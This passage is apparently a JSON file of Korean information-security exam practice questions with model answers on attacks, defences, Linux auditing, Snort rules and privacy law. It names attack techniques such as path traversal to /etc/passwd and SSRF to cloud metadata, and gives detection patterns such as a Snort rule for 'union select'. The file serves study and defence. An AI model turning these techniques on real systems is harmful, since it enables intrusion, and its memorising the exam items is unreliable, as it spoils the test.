시작한 연결의 응답 패킷을 허용하여 정상 통신을 보장한다.","explanation":"iptables 실무형은 '기본정책 DROP → 필요 포트만 ACCEPT'의 화이트리스트 원칙이 핵심이다. `-P`(정책), `-A`(규칙 추가), `-p`(프로토콜), `--dport`(목적지 포트), `-s`(출발지 IP), `-j`(타겟), `-m state`(연결 상태) 옵션을 정확히 써야 한다. SSH를 특정 IP로 제한하는 것과 ESTABLISHED 상태 허용은 자주 나오는 채점 요소다."}],"round":1},{"round":2,"title":"제2회 예상문제","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음은 리눅스 파일 생성 권한에 대한 설명이다. 빈칸에 들어갈 값을 쓰시오.\n\n신규 파일의 기본 권한은 666, 디렉터리는 777에서 ( ① ) 값을 뺀 만큼 부여된다. 만약 ( ① ) 값이 022로 설정되어 있다면, 새로 생성되는 **파일의 권한은 ( ② )** 가 된다.","scenario":"","answer":"① umask\n② 644 (rw-r--r--)","explanation":"umask는 파일·디렉터리 생성 시 제거할 권한을 지정한다. 파일 기본값 666에서 022를 빼면 644, 디렉터리 777에서 022를 빼면 755가 된다. 보안 강화를 위해 umask를 022 또는 027로 설정하여 그룹·타인의 쓰기 권한을 제한한다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 설명에 해당하는 보안 솔루션/기법을 쓰시오.\n\n시스템의 주요 파일(설정 파일, 실행 파일 등)에 대한 **해시값(무결성 기준값)을 미리 저장**해 두고, 주기적으로 현재 파일의 해시값과 비교하여 **파일이 변조·위조되었는지 탐지**하는 무결성 점검 도구이다. 대표 도구로 Tripwire, AIDE가 있다.","scenario":"","answer":"무결성 점검 (파일 무결성 검사, File Integrity Monitoring)","explanation":"무결성 점검 도구는 루트킷·백도어에 의한 시스템 파일 변조를 탐지한다. 기준 DB(해시값)는 반드시 안전한 매체에 별도 보관하여 공격자가 기준값까지 변조하지 못하게 해야 한다. 해시는 MD5보다 충돌 위험이 낮은 SHA-256 계열을 권장한다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 DoS 공격 기법을 쓰시오.\n\n공격자가 출발지 IP를 **피해자의 IP로 위조**한 ICMP Echo Request 패킷을 **브로드캐스트 주소로 전송**한다. 네트워크의 다수 호스트가 피해자에게 일제히 ICMP Echo Reply를 보내게 되어, 피해자에게 트래픽이 집중되는 증폭형 DoS 공격이다.","scenario":"","answer":"스머프 공격 (Smurf Attack)","explanation":"Smurf는 브로드캐스트와 IP 스푸핑을 악용한 증폭(amplification) 공격이다. 대응으로는 라우터에서 **directed broadcast 차단**, 호스트가 브로드캐스트 ICMP에 응답하지 않도록 설정, 인그레스 필터링(출발지 IP 검증)이 있다. 유사 공격으로 UDP 기반의 Fraggle이 있다."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"IPSec에 대한 다음 설명에서 (①), (②)에 들어갈 프로토콜을 쓰시오.\n\n- ( ① ) : 데이터의 **무결성과 인증**은 제공하지만 **기밀성(암호화)은 제공하지 않는** 프로토콜이다.\n- ( ② ) : 무결성·인증에 더해 **데이터 암호화(기밀성)까지 제공**하는 프로토콜이다.","scenario":"","answer":"① AH (Authentication Header)\n② ESP (Encapsulating Security Payload)","explanation":"IPSec은 AH와 ESP 두 프로토콜을 제공한다. AH는 인증·무결성만, ESP는 암호화까지 제공하므로 실무에서는 주로 ESP를 사용한다. 동작 모드는 전송모드(Transport, 페이로드만 보호)와 터널모드(Tunnel, IP 헤더까지 보호 - VPN)로 나뉜다. 키 교환은 IKE가 담당한다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 스위치 공격 기법을 쓰시오.\n\n스위치의 MAC 주소 테이블은 크기가 제한되어 있다. 공격자가 **위조된 출발지 MAC 주소를 가진 다량의 프레임을 전송**하여 MAC 테이블을 가득 채우면, 스위치가 정상 학습을 못하고 모든 포트로 프레임을 브로드캐스트(허브처럼 동작)하게 되어 스니핑이 가능해진다.","scenario":"","answer":"스위치 재밍 (Switch Jamming / MAC Flooding)","explanation":"MAC Flooding은 스위치의 CAM 테이블 오버플로우를 유발해 스위치를 페일오픈(fail-open) 상태로 만든다. 대응으로는 스위치의 **포트 보안(Port Security)** 기능으로 포트당 학습 MAC 수를 제한하는 것이 핵심이다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음은 XSS(크로스 사이트 스크립팅)의 유형에 대한 설명이다. (①), (②)에 들어갈 유형을 쓰시오.\n\n- ( ① ) XSS : 악성 스크립트가 **게시판·댓글 등 서버 DB에 저장**되어, 해당 페이지를 열람하는 모든 사용자에게 스크립트가 실행된다.\n- ( ② ) XSS : 악성 스크립트가 저장되지 않고, 요청 파라미터에 담긴 스크립트가 **서버 응답에 그대로 반사**되어 실행된다. 주로 피싱 링크 형태로 유포된다.","scenario":"","answer":"① 저장형 (Stored / Persistent)\n② 반사형 (Reflected)","explanation":"XSS는 저장형, 반사형, DOM 기반으로 나뉜다. 저장형은 지속적이라 피해 범위가 넓고, 반사형은 악성 링크 클릭을 유도한다. 공통 대응은 **입력값 검증 + 출력 시 HTML 인코딩(이스케이프)**, CSP 헤더, HttpOnly 쿠키다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 웹 공격을 쓰시오.\n\n공격자가 URL이나 파라미터에 `../` 와 같은 상위 디렉터리 이동 문자를 삽입하여, 웹 애플리케이션의 접근 허용 범위를 벗어난 **서버의 임의 파일(예: /etc/passwd)에 접근**하는 공격이다.","scenario":"","answer":"디렉터리 트래버설 (Directory Traversal / Path Traversal, 경로 조작)","explanation":"`../`(dot-dot-slash)로 상위 경로를 거슬러 시스템 파일에 접근한다. 대응으로는 사용자 입력을 파일 경로에 직접 사용 금지, `../` 등 경로 순회 문자 필터링, 화이트리스트 기반 파일 접근, 웹 서버 실행 계정의 최소 권한 적용이 있다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 해시 함수의 특성에 대한 설명이다. (①), (②)에 들어갈 용어를 쓰시오.\n\n- ( ① ) : 해시값(출력)으로부터 원본 입력값을 알아낼 수 없어야 한다. (일방향성)\n- ( ② ) : 서로 다른 두 입력이 동일한 해시값을 갖는 경우를 찾기 어려워야 한다. (충돌 저항성)","scenario":"","answer":"① 역상 저항성 (Preimage Resistance, 일방향성)\n② 충돌 저항성 (Collision Resistance)","explanation":"해시 함수는 임의 길이 입력을 고정 길이 출력으로 변환하며, 무결성 검증·전자서명·패스워드 저장에 쓰인다. 주요 특성은 일방향성(역상 저항성), 제2 역상 저항성, 충돌 저항성이다. MD5·SHA-1은 충돌이 발견되어 SHA-256 이상을 권장한다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 인증 프로토콜을 쓰시오.\n\nMIT에서 개발한 **대칭키 기반의 티켓(Ticket)** 인증 프로토콜로, KDC(키 분배 센터)가 발급하는 TGT(Ticket Granting Ticket)를 이용하여 사용자를 인증한다. Windows 액티브 디렉터리(AD)의 기본 인증 방식이며, SSO 구현에 사용된다.","scenario":"","answer":"커버로스 (Kerberos)","explanation":"Kerberos는 AS(인증 서버)와 TGS(티켓 발급 서버)로 구성된 KDC를 통해 티켓 기반 인증을 수행한다. 대칭키를 사용하며 타임스탬프로 재전송 공격을 방지한다. 단점은 KDC가 단일 실패 지점(SPOF)이 되고 시간 동기화(NTP)에 민감하다는 점이다. Golden Ticket 공격의 대상이다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 침입탐지시스템(IDS)의 탐지 방식이다. (①), (②)에 들어갈 방식을 쓰시오.\n\n- ( ① ) 탐지 : 알려진 공격 패턴(시그니처)과 비교하여 탐지한다. 오탐(false positive)이 적으나 **알려지지 않은 공격은 탐지 못한다.**\n- ( ② ) 탐지 : 정상 행위의 프로파일(기준)을 벗어나는 이상 행위를 탐지한다. **미지의 공격(제로데이) 탐지가 가능**하나 오탐이 많다.","scenario":"","answer":"① 오용 (Misuse / Signature 기반)\n② 이상 (Anomaly 기반)","explanation":"오용 탐지는 시그니처 기반으로 알려진 공격에 강하지만 신종 공격에 취약하고, 이상 탐지는 통계·행위 기반으로 미지의 공격을 잡지만 오탐이 많다. 두 방식을 병행하는 것이 일반적이다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"개인정보보호법상 정보주체가 자신의 개인정보에 대해 행사할 수 있는 권리 중, 다음 설명에 해당하는 권리를 쓰시오.\n\n정보주체는 개인정보처리자에게 자신의 개인정보 처리를 멈추도록 요구할 수 있으며, 개인정보처리자는 정당한 사유가 없으면 지체 없이 이에 응하여야 한다.","scenario":"","answer":"(개인정보) 처리정지 요구권","explanation":"정보주체의 권리(개인정보보호법 제4조)에는 정보 제공받을 권리, 동의 선택·결정권, 열람(사본 발급) 요구권, 정정·삭제 요구권, **처리정지 요구권**, 자동화된 결정에 대한 거부·설명 요구권(2023 개정 신설) 등이 있다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음 설명에 해당하는 용어를 쓰시오.\n\n정보통신망법에 근거하여, 주민등록번호를 대체하기 위해 온라인상에서 개인을 식별할 수 있도록 생성한 13자리 연계용 개인식별정보로, 서로 다른 웹사이트 간 회원을 연계할 때 사용된다.","scenario":"","answer":"CI (연계정보, Connecting Information)","explanation":"CI는 주민등록번호를 일방향 해시하여 생성한 연계정보로, 정보통신망법 제23조의5에 근거한다. 유사 개념으로 특정 사이트 내에서만 쓰이는 DI(중복가입확인정보)가 있다. CI는 서로 다른 서비스 간 동일인 여부 확인에 사용되며 엄격한 안전조치가 요구된다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"DDoS(분산 서비스 거부) 공격에 대하여 다음 물음에 답하시오.\n\n(1) DDoS 공격의 개념을 DoS와 비교하여 서술하시오. (4점)\n(2) 공격 대상 계층에 따라 **대역폭 공격**과 **자원 소진 공격**으로 나눌 때, 각 유형의 예시를 1가지 이상 들어 설명하시오. (4점)\n(3) DDoS 공격에 대한 대응방안을 3가지 서술하시오. (4점)","scenario":"","answer":"**(1) 개념**\n- DoS는 단일 공격자가 대상 시스템의 자원을 고갈시켜 서비스를 마비시키는 공격이다.\n- **DDoS**는 다수의 감염된 좀비 PC(**봇넷**)를 이용해 여러 곳에서 동시에 공격하여, 출발지가 분산되어 **차단과 추적이 어렵고 공격 규모가 훨씬 크다.**\n\n**(2) 유형별 예시**\n- **대역폭 공격(Volumetric)** : 대량 트래픽으로 네트워크 회선을 포화시킴 — UDP Flooding, ICMP Flooding, DNS 증폭\n- **자원 소진 공격** : 서버의 연결·처리 자원을 고갈 — SYN Flooding(연결 큐 고갈), HTTP GET/POST Flooding(웹 서버 자원 고갈)\n\n**(3) 대응방안**\n- **anti-DDoS 장비 / CDN·클라우드 기반 방어** 서비스로 트래픽 분산·흡수\n- 방화벽·IPS에서 **임계치 기반 필터링**, 출발지 IP 검증(인그레스 필터링)\n- ISP와 협조하여 **블랙홀 라우팅**, 정상 트래픽만 통과시키는 스크러빙 센터 활용","explanation":"DDoS는 DoS와의 차이(분산·봇넷), 계층별 유형(대역폭 vs 자원소진), 대응(장비·CDN·임계치·ISP협조)을 구조적으로 서술한다. SYN Flooding이 자원 소진형이라는 점, DNS 증폭이 대역폭형이라는 점을 정확히 분류하는 것이 채점 포인트다."},{"num":14,"type":"서술형","points":12,"domain":"애플리케이션·웹 보안","question":"XSS(Cross-Site Scripting) 공격에 대하여 다음 물음에 답하시오.\n\n(1) XSS 공격의 개념을 서술하시오. (4점)\n(2) XSS의 유형 3가지를 쓰고 각각 간략히 설명하시오. (4점)\n(3) XSS와 CSRF의 차이점을 '신뢰 관계' 관점에서 서술하시오. (4점)","scenario":"","answer":"**(1) 개념**\n- 공격자가 웹 페이지에 **악성 스크립트(주로 JavaScript)를 삽입**하여, 이를 열람하는 다른 사용자의 브라우저에서 실행되게 하는 공격이다. 세션 쿠키 탈취, 피싱, 화면 변조 등에 악용된다.\n\n**(2) 유형 3가지**\n- **저장형(Stored)** : 악성 스크립트가 서버 DB에 저장되어 열람자 모두에게 실행됨(게시판 등)\n- **반사형(Reflected)** : 요청 파라미터의 스크립트가 응답에 반사되어 실행됨(악성 링크)\n- **DOM 기반** : 서버를 거치지 않고 클라이언트 측 스크립트가 DOM을 조작하며 실행됨\n\n**(3) XSS vs CSRF**\n- **XSS** : **사용자가 서버(사이트)를 신뢰**하는 점을 악용 → 사용자 브라우저에서 악성 스크립트 실행\n- **CSRF** : **서버가 인증된 사용자를 신뢰**하는 점을 악용 → 사용자 권한으로 위조된 요청 전송\n- 공통 대응은 다르며, XSS는 출력 인코딩, CSRF는 CSRF 토큰이 핵심이다.","explanation":"XSS 서술형은 개념·유형 3가지·CSRF와의 신뢰관계 비교가 핵심이다. \"XSS=사용자가 서버를 신뢰 / CSRF=서버가 사용자를 신뢰\"라는 대비는 반드시 정확히 써야 한다. 대응(출력 인코딩, HttpOnly, CSP)도 함께 언급하면 좋다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"침입탐지시스템(IDS)과 침입방지시스템(IPS)에 대하여 다음 물음에 답하시오.\n\n(1) IDS와 IPS의 차이점을 **동작 위치와 대응 방식** 측면에서 서술하시오. (6점)\n(2) IDS의 오탐(False Positive)과 미탐(False Negative)의 의미를 각각 서술하시오. (6점)","scenario":"","answer":"**(1) IDS vs IPS**\n- **IDS(침입탐지시스템)** : 네트워크·시스템을 **패시브(passive)**하게 모니터링하며, 침입을 **탐지·경보**한다. 트래픽 경로 밖(미러링/TAP)에 위치하여 실시간 차단은 하지 못한다.\n- **IPS(침입방지시스템)** : 트래픽 경로상에 **인라인(in-line)**으로 위치하여, 침입을 탐지하는 즉시 **능동적으로 차단·대응**한다. 탐지+차단을 함께 수행한다.\n\n**(2) 오탐과 미탐**\n- **오탐(False Positive)** : **정상 행위를 공격으로 잘못 판단**하는 것. 과도하면 불필요한 경보·차단으로 정상 서비스에 지장을 준다.\n- **미탐(False Negative)** : **실제 공격을 정상으로 판단하여 탐지하지 못하는** 것. 보안상 더 치명적이며, 침입을 놓치게 된다.","explanation":"IDS(탐지·패시브) vs IPS(차단·인라인)의 위치·대응 차이가 핵심이다. 오탐/미탐은 용어 혼동이 잦은데, 오탐=정상을 공격으로(양치기 소년), 미탐=공격을 놓침(더 위험)으로 명확히 구분해야 한다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"정보보호 위험 분석 방법론에 대하여 다음 물음에 답하시오.\n\n(1) 정량적 위험 분석과 정성적 위험 분석의 차이를 서술하시오. (6점)\n(2) 정량적 분석에서 사용되는 **연간예상손실(ALE)**의 계산식을 SLE, ARO 용어를 사용하여 쓰고, 각 용어의 의미를 설명하시오. (6점)","scenario":"","answer":"**(1) 정량적 vs 정성적 위험 분석**\n- **정량적 분석** : 위험을 **금액 등 수치**로 산정한다(예: ALE). 객관적 비교·비용편익 분석이 가능하나 계산이 복잡하고 정확한 데이터 확보가 어렵다.\n- **정성적 분석** : 위험을 **높음/중간/낮음** 등 등급으로 평가한다(델파이, 시나리오법 등). 수행이 간편하나 주관이 개입되고 비용 산정이 어렵다.\n\n**(2) ALE 계산식**\n- **ALE(연간예상손실) = SLE × ARO**\n- **SLE(단일예상손실, Single Loss Expectancy)** : 위협이 1회 발생 시 예상되는 손실액 (= 자산가치 × 노출계수 EF)\n- **ARO(연간발생률, Annualized Rate of Occurrence)** : 해당 위협이 1년간 발생할 것으로 예상되는 횟수\n- 예: SLE 1,000만 원, ARO 0.5회 → ALE = 500만 원","explanation":"위험분석은 정량적(수치/ALE) vs 정성적(등급/델파이) 구분과 ALE=SLE×ARO 공식이 핵심이다. SLE=자산가치×EF(노출계수), ARO=연간발생빈도를 정확히 써야 한다. 정량 분석 결과는 보호대책 도입 비용과 비교하는 비용편익 분석의 근거가 된다."},{"num":17,"type":"실무형","points":16,"domain":"시스템 보안 (계정 점검)","question":"아래는 리눅스 서버의 /etc/passwd 파일 일부이다. 이를 분석하여 물음에 답하시오.","scenario":"```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nadmin:x:0:0::/home/admin:/bin/bash\ntest:x:1001:1001::/home/test:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n\n(1) 위 파일에서 **보안상 문제가 되는 계정**을 찾고, 그 이유를 서술하시오. (6점)\n(2) `test` 계정 라인의 각 **필드(콜론으로 구분된 7개 항목)의 의미**를 순서대로 서술하시오. (4점)\n(3) 발견된 문제에 대한 **조치 방안**을 서술하시오. (6점)","answer":"**(1) 보안상 문제가 있는 계정과 이유**\n- **admin 계정** : UID가 **0**이다. UID 0은 root와 동일한 **최고 관리자 권한**을 의미하므로, root 외에 UID 0을 가진 계정은 **백도어(권한 상승) 계정**일 가능성이 높다.\n- **test 계정** : 로그인 셸이 `/bin/bash`로 되어 있어 로그인이 가능하다. 불필요한 계정이라면 로그인 셸을 `/sbin/nologin` 또는 `/bin/false`로 변경해야 한다.\n\n**(2) 계정 필드 의미**\n- `test:x:1001:1001::/home/test:/bin/bash`\n- test(사용자명) : x(패스워드, /etc/shadow 참조) : 1001(UID) : 1001(GID) : (설명/comment) : /home/test(홈 디렉터리) : /bin/bash(로그인 셸)\n\n**(3) 조치 방안**\n- UID 0 중복 계정(admin) **삭제 또는 UID 변경**, 침해 여부 조사\n- 불필요 계정의 로그인 셸을 **nologin 처리**, 사용하지 않는 계정 잠금(`passwd -l`)\n- `/etc/passwd`·`/etc/shadow` 권한 점검, 정기적인 UID 0 계정 감사(`awk -F: '$3==0' /etc/passwd`)","explanation":"passwd 분석 실무형의 핵심은 **UID 0 = root 권한**이라는 점이다. root 외에 UID 0을 가진 계정은 백도어이므로 즉시 식별해야 한다. passwd의 7개 필드 순서(계정:패스워드:UID:GID:설명:홈:셸)를 정확히 아는 것과, nologin 셸 처리·계정 잠금 조치가 채점 포인트다."},{"num":18,"type":"실무형","points":16,"domain":"네트워크 보안 (Snort 탐지 룰)","question":"아래는 침입탐지시스템 Snort의 탐지 룰이다. 이를 분석하여 물음에 답하시오.","scenario":"```\nalert tcp any any -> 192.168.0.10 80 ( \\\n    msg:\"Directory Traversal Attempt\"; \\\n    content:\"/etc/passwd\"; \\\n    sid:1000001; )\n```\n\n(1) 위 Snort 룰의 각 구성 요소(`alert`, `tcp any any -> 192.168.0.10 80`, `content`, `msg`)의 의미를 서술하시오. (6점)\n(2) 위 룰이 탐지하려는 **공격 유형**은 무엇인지 근거와 함께 쓰시오. (4점)\n(3) **SQL 인젝션 시도**를 탐지하는 Snort 룰을 위 형식을 참고하여 작성하시오. (6점)","answer":"**(1) 룰 구조 분석**\n- `alert` : 탐지 시 **경보(alert)**를 발생시키는 액션\n- `tcp any any -> 192.168.0.10 80` : **모든 출발지**에서 **192.168.0.10의 80번 포트(웹)**로 향하는 TCP 트래픽을 탐지 대상으로 지정\n- `content:\"/etc/passwd\"` : 패킷 페이로드에 **`/etc/passwd` 문자열이 포함**되면 탐지\n- `msg` : 탐지 시 출력할 경보 메시지\n\n**(2) 탐지하려는 공격**\n- 웹 요청에 `/etc/passwd`가 포함된 것으로 보아 **디렉터리 트래버설(경로 조작) 또는 LFI**를 통해 시스템 계정 파일을 탈취하려는 시도를 탐지한다.\n\n**(3) 추가 탐지 룰 (예시)**\n```\nalert tcp any any -> 192.168.0.10 80 (msg:\"SQL Injection Attempt\"; content:\"union select\"; nocase; sid:1000002;)\n```\n- `content:\"union select\"` 로 SQL 인젝션 시도를 탐지하며, `nocase`로 대소문자를 구분하지 않도록 한다.","explanation":"Snort 룰은 '헤더(액션 프로토콜 출발지 → 목적지) + 옵션(content, msg, sid)' 구조다. `alert tcp any any -> IP port` 해석과 `content`로 탐지할 문자열을 지정하는 방식을 이해하면 된다. `/etc/passwd` content는 경로 조작/LFI 탐지용임을 파악하고, 추가 룰에서 `content`와 `nocase` 옵션을 올바르게 쓰는 것이 채점 포인트다."}]},{"round":3,"title":"제3회 예상문제","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음은 리눅스에서 열린 포트와 연결 상태를 확인하는 명령어에 대한 설명이다. 빈칸에 들어갈 명령어를 쓰시오.\n\n현재 시스템의 네트워크 연결 상태, LISTEN 중인 포트, 관련 프로세스(PID) 등을 확인할 때 사용하는 명령어로, `-a`(전체), `-n`(숫자표시), `-t`(TCP), `-p`(프로세스) 옵션을 조합해 사용한다. (최근에는 `ss` 명령으로 대체되고 있다.)","scenario":"","answer":"netstat","explanation":"`netstat -antp`는 열린 포트·연결 상태·프로세스를 함께 보여주어 백도어 포트나 비정상 연결을 탐지하는 데 유용하다. 최신 리눅스에서는 더 빠른 `ss -antp`를 권장한다. 특정 포트를 사용하는 프로세스 확인에는 `lsof -i :포트`도 쓰인다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 명령의 목적을 고려할 때, 빈칸에 들어갈 알맞은 값을 쓰시오.\n\n시스템에 숨겨진 백도어(권한 상승용 SetUID 파일)를 점검하기 위해, 소유자가 root이면서 SetUID 비트가 설정된 파일을 전체 검색하는 명령은 다음과 같다.\n`find / -user root -perm -( ① ) -type f`","scenario":"","answer":"① 4000","explanation":"SetUID 비트의 8진수 값은 4000이다. `find / -perm -4000`은 시스템 전체의 SetUID 파일을 찾아 백도어 여부를 점검하는 대표적 명령이다. SetGID는 2000, Sticky Bit는 1000이다. 정상 SetUID 파일 목록과 비교하여 비인가 파일을 식별한다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 공격 기법을 쓰시오.\n\n공격자가 패킷의 **출발지 IP와 목적지 IP를 모두 피해자의 IP로 동일하게 위조**하고, 출발지·목적지 포트도 동일하게 설정하여 전송한다. 피해자 시스템이 자기 자신에게 무한 응답을 시도하게 되어 시스템 부하가 발생하는 DoS 공격이다.","scenario":"","answer":"랜드 어택 (Land Attack)","explanation":"Land Attack은 출발지=목적지 IP로 위조하여 시스템이 자기 자신과 통신 루프에 빠지게 한다. 대응으로는 방화벽·라우터에서 **출발지 IP와 목적지 IP가 동일한 패킷을 필터링**하고, OS 패치를 적용한다."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 공격을 쓰시오.\n\n공격자가 DNS 서버의 캐시에 **위조된 도메인-IP 매핑 정보를 삽입**하여, 사용자가 정상 도메인을 입력해도 공격자의 악성 사이트(위조 사이트)로 접속되도록 유도하는 공격이다. 파밍(Pharming)의 주요 수단이 된다.","scenario":"","answer":"DNS 캐시 포이즈닝 (DNS Cache Poisoning / DNS 스푸핑)","explanation":"DNS 캐시 포이즈닝은 DNS 응답 위조로 캐시를 오염시킨다. 대응으로는 **DNSSEC**(응답에 전자서명으로 무결성·출처 인증), 트랜잭션 ID·출발지 포트 랜덤화, 신뢰할 수 있는 DNS 서버 사용이 있다. 결과적으로 파밍 피해로 이어진다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 네트워크 접근제어 솔루션을 쓰시오.\n\n네트워크에 접속하려는 단말(PC, 모바일 등)의 보안 상태(백신 설치, 패치 여부 등)를 점검하여, 정책에 부합하지 않는 단말의 네트워크 접근을 차단하거나 격리하는 솔루션이다. 인가되지 않은 단말의 내부망 접속을 통제한다.","scenario":"","answer":"NAC (Network Access Control, 네트워크 접근제어)","explanation":"NAC은 단말 인증 + 보안 상태 점검(무결성 검사)으로 접근을 통제한다. 미인가 단말·보안 미비 단말을 격리(격리 VLAN)하고, 치료 후 접속을 허용한다. MAC 주소 기반 인증, 802.1X 연동 등으로 구현한다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 웹 취약점을 쓰시오.\n\n서버가 사용자가 입력한 URL로 요청을 보내는 기능을 악용하여, 공격자가 **서버로 하여금 내부망의 시스템(관리 페이지, 클라우드 메타데이터 등)에 접근**하도록 요청을 위조하는 공격이다. OWASP Top 10 2021에 신규 포함되었다.","scenario":"","answer":"SSRF (Server-Side Request Forgery, 서버 측 요청 위조)","explanation":"SSRF는 서버가 임의 URL로 요청을 보내는 점을 악용해 방화벽 뒤 내부 자원(예: 클라우드 169.254.169.254 메타데이터)에 접근한다. 대응으로는 요청 대상 URL **화이트리스트**, 내부 IP 대역 차단, 응답 최소화, 불필요한 리다이렉트 제거가 있다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음은 웹 인증 관리에 대한 설명이다. (①), (②)에 들어갈 용어를 쓰시오.\n\n- ( ① ) : 클라이언트(브라우저) 측에 저장되는 작은 데이터로, 탈취 시 세션 하이재킹에 악용될 수 있다.\n- ( ② ) : ( ① )가 스크립트로 접근되지 못하도록 막아 XSS를 통한 탈취를 방지하는 쿠키 속성이다.","scenario":"","answer":"① 쿠키 (Cookie)\n② HttpOnly","explanation":"쿠키는 클라이언트에, 세션은 서버에 상태를 저장한다. 쿠키 보안 속성으로 **HttpOnly**(JavaScript 접근 차단→XSS 방어), **Secure**(HTTPS 전송만 허용), **SameSite**(CSRF 완화)가 있다. 세션 ID 쿠키에는 이들 속성을 함께 설정한다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 공개키 암호 알고리즘을 쓰시오.\n\n두 개의 큰 소수의 곱으로 만든 합성수의 **소인수분해가 어렵다는 점**에 기반한 공개키 암호 알고리즘으로, 1977년 개발자 세 명의 이름 첫 글자를 따서 명명되었다. 전자서명과 키 교환에 널리 사용된다.","scenario":"","answer":"RSA","explanation":"RSA(Rivest-Shamir-Adleman)는 소인수분해의 어려움에 기반한다. 키가 길수록 안전하나 속도가 느려 데이터 암호화보다는 키 교환·전자서명에 쓰인다. 짧은 키로 동일 안전성을 제공하는 ECC(타원곡선)가 모바일·IoT에서 대안으로 쓰인다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 보안 모델을 쓰시오.\n\n**기밀성**을 보장하기 위한 접근통제 모델로, 주체는 자신보다 **높은 등급의 객체를 읽을 수 없고(No Read Up), 낮은 등급의 객체에 쓸 수 없다(No Write Down)**는 규칙을 갖는다.","scenario":"","answer":"BLP 모델 (Bell-LaPadula Model)","explanation":"BLP는 기밀성 중심 모델로 No Read Up(상위 읽기 금지), No Write Down(하위 쓰기 금지=기밀 유출 방지) 규칙을 갖는다. 반대로 **무결성** 중심인 Biba 모델은 No Read Down, No Write Up 규칙을 갖는다. 무결성 모델에는 Clark-Wilson, 만리장성(Chinese Wall)도 있다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 보안 기술을 쓰시오.\n\n디지털 콘텐츠(문서, 음원, 영상 등)의 저작권 보호를 위해, 콘텐츠를 **암호화하고 사용 권한(열람·복사·인쇄·기간 등)을 통제**하는 기술이다. 문서가 외부로 유출되어도 권한이 없으면 열람할 수 없다.","scenario":"","answer":"DRM (Digital Rights Management, 디지털 저작권 관리)","explanation":"DRM은 콘텐츠 자체를 암호화하고 라이선스로 사용 권한을 통제한다. 기업에서는 문서 DRM으로 내부 문서 유출을 방지한다. DLP가 '유출 경로 감시·차단' 중심이라면, DRM은 '콘텐츠 암호화·권한 통제'로 반출되어도 열람을 제한한다는 점이 다르다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음 설명에 해당하는 제도를 쓰시오.\n\n공공기관이 일정 규모 이상의 개인정보 파일을 구축·운용·변경하려는 경우, 개인정보 침해 위험 요인을 사전에 분석·평가하고 개선 방안을 도출하는 제도이다. 개인정보보호법에 근거하며 영문 약어로 PIA라고도 한다.","scenario":"","answer":"개인정보 영향평가 (PIA, Privacy Impact Assessment)","explanation":"PIA는 개인정보 파일 구축 전 침해 위험을 사전 진단하는 제도다. 공공기관은 일정 규모(예: 5만 명 이상 민감정보, 50만 명 이상 연계, 100만 명 이상 등) 개인정보 파일에 대해 의무 수행한다. 신규·변경 시스템의 설계 단계에서 개인정보보호 원칙(Privacy by Design)을 반영한다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음 설명에 해당하는 직위를 쓰시오.\n\n정보통신망법 및 개인정보보호법에 따라, 기업의 정보보호 업무를 총괄하는 책임자로서 정보보호 계획 수립, 취약점 분석·평가, 침해사고 예방·대응 등을 담당한다. 일정 규모 이상 기업은 이 책임자를 지정·신고해야 한다.","scenario":"","answer":"CISO (Chief Information Security Officer, 정보보호 최고책임자)","explanation":"CISO는 정보통신망법에 따라 정보보호 업무를 총괄한다(개인정보 보호는 CPO/개인정보보호책임자가 담당). 일정 규모 이상 정보통신서비스 제공자는 CISO를 지정·신고해야 하며, 겸직 제한 규정이 적용되는 경우가 있다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"세션 하이재킹(Session Hijacking) 공격에 대하여 다음 물음에 답하시오.\n\n(1) TCP 세션 하이재킹의 개념과 공격 원리를 서술하시오. (6점)\n(2) 세션 하이재킹에 대한 대응방안을 3가지 이상 서술하시오. (6점)","scenario":"","answer":"**(1) 개념 및 원리**\n- 개념 : 정상 사용자가 서버와 인증을 마치고 맺은 **TCP 세션을 가로채**, 공격자가 인증 없이 서버 자원에 접근하는 공격이다.\n- 원리 : 공격자는 스니핑으로 세션의 **시퀀스 넘버(Sequence Number)**를 알아낸 뒤, 클라이언트를 가장한 패킷(위조 시퀀스 넘버)을 서버에 전송하여 세션을 탈취한다. 이 과정에서 정상 클라이언트와 서버의 시퀀스 넘버가 어긋나 **ACK Storm(비동기화 